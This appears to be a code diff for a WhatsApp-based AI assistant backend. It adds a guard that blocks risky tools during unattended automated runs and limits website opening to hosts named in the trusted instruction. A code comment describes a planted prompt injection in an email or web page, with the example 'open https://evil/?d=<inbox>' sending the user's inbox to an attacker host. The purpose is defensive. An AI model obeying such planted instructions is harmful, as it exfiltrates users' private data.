@@ -42,7 +42,7 @@ const { executeNewsTool } = require('./newsExecutor');
 const { executeShopifyTool } = require('./shopifyExecutor');
 const { integrationToolsForUser } = require('./integrationTools');
 const {
-  executeIntegrationTool, pendingActionsBlock, gateBuiltin, setBuiltinRunner, BUILTIN_GATED,
+  executeIntegrationTool, pendingActionsBlock, gateBuiltin, setBuiltinRunner, builtinNeedsYes,
 } = require('./integrationExecutor');
 const { imageToolNames, imageToolsAvailable } = require('./imageTools');
 const { executeImageTool, recentImagesBlock } = require('./imageExecutor');
@@ -259,7 +259,7 @@ async function runAutomatedInstruction(user, instruction) {
     `\n\n--- AUTOMATED RUN ---\nThis is a scheduled standing instruction you set up earlier, firing now — the user did NOT just message you. Carry it out with your tools and reply with ONLY the message to send them: the result itself (e.g. the traffic update), briefly and naturally, as if you proactively reached out. Do not ask questions or say "let me know" — just do it. If for some reason it genuinely cannot be done right now, reply with a short honest note about that instead.`;
 
   const messages = [{ role: 'user', content: `[Scheduled instruction firing now] ${instruction}` }];
-  const reply = await runToolLoop(user, messages, system, 4, { automated: true });
+  const reply = await runToolLoop(user, messages, system, 4, { automated: true, trustedText: instruction });
   return (reply || '').trim() || null;
 }
 
@@ -288,9 +288,32 @@ async function runBuiltinTool(user, name, input) {
   if (gmailToolNames.has(name)) return executeGmailTool(fresh, toolUse);
   if (webmailToolNames.has(name)) return executeWebmailTool(fresh, toolUse);
   if (driveToolNames.has(name)) return executeDriveTool(fresh, toolUse);
+  if (automationToolNames.has(name)) return executeAutomationTool(fresh, toolUse);
   return executeCalendarTool(fresh, toolUse);
 }
 setBuiltinRunner(runBuiltinTool);
+
+/**
+ * Automated runs (scheduled automations, voice calls) have no user reading
+ * along, and their text may have come from an email or a web page. They never
+ * act in a browser, save credentials or install new automations, and only open
+ * websites the instruction itself names — a planted "open https://evil/?d=<inbox>"
+ * would otherwise carry the user's data out. Returns an error result or null.
+ */
+function automatedRefusal(name, input = {}, ctx = {}) {
+  if (!ctx.automated) return null;
+  if (name === 'browse_and_act' || name === 'save_credential' || name === 'create_automation') {
+    return { error: 'NOT_IN_AUTOMATED_RUN', detail: 'This needs the user in the chat. Tell them what you would do so they can ask for it on WhatsApp.' };
+  }
+  if (name === 'open_website') {
+    let host = '';
+    try { host = new URL(String(input.url || '')).hostname.toLowerCase().replace(/^www\./, ''); } catch (_) { /* bad url */ }
+    if (!host || !String(ctx.trustedText || '').toLowerCase().includes(host)) {
+      return { error: 'NOT_IN_AUTOMATED_RUN', detail: 'Automated runs only open websites the instruction itself names.' };
+    }
+  }
+  return null;
+}
 
 /**
  * Answer a question the user asked during a briefing CALL (the ElevenLabs
@@ -303,7 +326,7 @@ async function answerForCall(user, question, { context = '' } = {}) {
     + `\n\n--- LIVE VOICE CALL ---\nThe user is on a WhatsApp voice call with you right now (your briefing call) and asked the question below out loud. Use your tools to get the real answer. Reply with ONLY what should be SPOKEN: one to three short, natural sentences, in the language they used (Roman Urdu/Urdu → speak Urdu-English mix; English → English). No lists, no markdown, no emoji, no links, no ids. If they asked you to DO something that needs their yes (send, post, delete, cancel), call the tool so it is ready, then say it's ready and they can say yes on WhatsApp — you cannot approve it from the call.`
     + (context ? `\n\nWhat has been said on the call so far (for reference): ${String(context).slice(0, 1500)}` : '');
   const messages = [{ role: 'user', content: String(question || '').slice(0, 1000) }];
-  const reply = await runToolLoop(user, messages, system, 5, { automated: true, toolLog: [] });
+  const reply = await runToolLoop(user, messages, system, 5, { automated: true, toolLog: [], trustedText: String(question || '') });
   return String(reply || '').replace(/[*_#`]/g, '').trim();
 }
 
@@ -371,11 +394,13 @@ async function runToolLoop(user, messages, system, maxRounds = 5, ctx = {}) {
           // Checked first: app tool names are Composio slugs, and anything not
           // matched below would otherwise fall through to the calendar executor.
           result = await executeIntegrationTool(user, { name: block.name, input: block.input }, ctx);
-        } else if (BUILTIN_GATED.has(block.name)) {
+        } else if ((result = automatedRefusal(block.name, block.input, ctx))) {
+          // Refused in an automated run — see automatedRefusal.
+        } else if (builtinNeedsYes(block.name, block.input)) {
           // Outward-facing / hard-to-undo built-ins wait for the user's yes on
           // the server, exactly like app tools.
           result = precheckBuiltin(user, block.name, block.input)
-            || await gateBuiltin(user, block.name, block.input, ctx, () => runBuiltinTool(user, block.name, block.input));
+            || await gateBuiltin(user, block.name, block.input, ctx);
         } else if (imageToolNames.has(block.name)) {
           result = await executeImageTool(user, { name: block.name, input: block.input });
         } else if (brainToolNames.has(block.name)) {
@@ -502,6 +527,7 @@ function parseWorkHours(text) {
 }
 
 module.exports = {
+  automatedRefusal,
   answerForCall,
   handleMessage,
   runConversation,
